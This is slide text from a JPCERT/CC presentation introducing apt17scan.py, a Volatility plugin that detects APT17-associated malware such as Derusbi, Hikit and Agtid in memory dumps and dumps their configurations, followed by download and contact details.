+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ANALYSIS TOOLS 
+apt17scan.py 
+
+84 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+ 
+apt17scan.py 
+
+apt17scan.py 
+
+• Volatility Plugin 
+• Detect malware in memory dump 
+• Extract malware configuration information 
+
+Function 
+
+• apt17scan 
+• derusbiconfig 
+• hikitconfig 
+• agtidconfig 
+
+85 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+apt17scan.py 
+
+Scan with YARA 
+
+Search configuration 
+data address 
+
+Parse configuration data 
+
+Dump configuration 
+
+86 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+apt17scan.py 
+
+apt17scan  Detecting Malware 
+
+Agtid 
+
+Hikit 
+
+McRAT 
+
+Preshin 
+
+BlackCoffee 
+
+Derusbi 
+
+87 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+apt17scan.py 
+
+derusbiconfig  Dump configuration information for Derusbi 
+
+88 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+apt17scan.py 
+
+hikitconfig Dump configuration information for Hikit 
+
+89 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+apt17scan.py 
+
+agtidconfig Dump configuration information for Agtid 
+
+90 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+DEMO 
+
+91 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+How to Download 
+
+https://github.com/JPCERTCC 
+
+92 
+
+Copyright©2015 JPCERT/CC All rights reserved. 
+
+Thank You! 
+
+Contact 
+
+aa-info@jpcert.or.jp 
+https://www.jpcert.or.jp 
+
+Incident Report 
+
+info@jpcert.or.jp 
+https://www.jpcert.or.jp/form/ 
+
+ 
+
